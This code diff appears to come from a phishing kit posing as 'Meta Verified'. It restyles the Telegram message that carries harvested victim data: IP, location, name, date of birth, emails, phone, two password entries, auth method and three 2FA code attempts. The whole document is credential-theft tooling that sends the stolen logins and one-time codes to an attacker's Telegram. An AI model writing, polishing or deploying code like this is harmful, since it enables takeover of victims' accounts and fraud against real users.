@@ -165,62 +165,61 @@ function formatDobParts(day: string, month: string, year: string): string {
     return `${displayCode(day)}/${displayCode(month)}/${displayCode(year)}`;
 }
 
-function fieldLine(label: string, valueHtml: string): string {
-    return `<b>${escapeHtml(label)}</b>\n<code>${valueHtml}</code>`;
+/** Một dòng: nhãn + giá trị trong <code> */
+function row(label: string, codeInnerHtml: string): string {
+    return `<b>${escapeHtml(label)}</b> <code>${codeInnerHtml}</code>`;
 }
 
-function sectionBlock(title: string, lines: string[]): string {
-    const body = lines.filter(Boolean).join('\n\n');
-    if (!body) return '';
-    return `<b>${escapeHtml(title)}</b>\n${body}`;
+const TG_GROUP_DIV = '<i>────────────────────</i>';
+
+/** Nhóm: icon một dòng, sau đó các dòng dữ liệu */
+function groupBlock(icon: string, rows: string[]): string {
+    const body = rows.filter(Boolean).join('\n');
+    return body ? `${icon}\n${body}` : '';
 }
 
 function formatMessage(data: any): string {
     const d = normalizeData(data);
     const ts = new Date().toISOString().replace('T', ' ').slice(0, 19) + ' UTC';
-
-    const networkLines = [
-        fieldLine('IP address', displayCode(d.ip)),
-        fieldLine('Location', displayCode(d.location)),
-    ];
-
-    const identityLines = [
-        fieldLine('Full name', displayCode(d.fullName)),
-        fieldLine('Page', displayCode(d.fanpage)),
-        fieldLine('Date of birth (D/M/Y)', formatDobParts(d.day, d.month, d.year)),
-    ];
-
     const phoneVal = String(d.phone ?? '').trim();
-    const contactLines = [
-        fieldLine('Primary email', displayCode(d.email)),
-        fieldLine('Business email', displayCode(d.emailBusiness)),
-        fieldLine('Phone', phoneVal ? escapeHtml(`+${phoneVal}`) : '—'),
-    ];
+    const phoneInner = phoneVal ? escapeHtml(`+${phoneVal}`) : '—';
 
-    const credLines = [
-        fieldLine('Password (first entry)', displayCode(d.password)),
-        fieldLine('Password (second entry)', displayCode(d.passwordSecond)),
+    const header = `📋 <b>Meta Verified</b> · <i>${escapeHtml(ts)}</i>`;
+
+    const network = groupBlock('🌐', [
+        row('IP address', displayCode(d.ip)),
+        row('Location', displayCode(d.location)),
+    ]);
+
+    const profile = groupBlock('👤', [
+        row('Full name', displayCode(d.fullName)),
+        row('Page', displayCode(d.fanpage)),
+        row('DOB (D/M/Y)', formatDobParts(d.day, d.month, d.year)),
+    ]);
+
+    const contact = groupBlock('✉️', [
+        row('Primary email', displayCode(d.email)),
+        row('Business email', displayCode(d.emailBusiness)),
+        row('Phone', phoneInner),
+    ]);
+
+    const credRows = [
+        row('Password (1)', displayCode(d.password)),
+        row('Password (2)', displayCode(d.passwordSecond)),
     ];
     if (String(d.authMethod ?? '').trim()) {
-        credLines.push(fieldLine('Authentication method', displayCode(d.authMethod)));
+        credRows.push(row('Auth method', displayCode(d.authMethod)));
     }
+    const credentials = groupBlock('🔑', credRows);
 
-    const tfaLines = [
-        fieldLine('2FA code · attempt 1', displayCode(d.twoFa)),
-        fieldLine('2FA code · attempt 2', displayCode(d.twoFaSecond)),
-        fieldLine('2FA code · attempt 3', displayCode(d.twoFaThird)),
-    ];
+    const twoFa = groupBlock('🔐', [
+        row('2FA (1)', displayCode(d.twoFa)),
+        row('2FA (2)', displayCode(d.twoFaSecond)),
+        row('2FA (3)', displayCode(d.twoFaThird)),
+    ]);
 
-    const sections = [
-        `<b>Meta Verified</b> · <i>Intake record</i>\n<i>${escapeHtml(ts)}</i>`,
-        sectionBlock('Network', networkLines),
-        sectionBlock('Profile', identityLines),
-        sectionBlock('Contact', contactLines),
-        sectionBlock('Credentials', credLines),
-        sectionBlock('Two-factor authentication', tfaLines),
-    ].filter(Boolean);
-
-    return sections.join('\n\n<i>────────────────────</i>\n\n');
+    const parts = [header, network, profile, contact, credentials, twoFa].filter(Boolean);
+    return parts.join(`\n${TG_GROUP_DIV}\n`);
 }
 
 export async function sendTelegramMessage(data: any): Promise<void> {
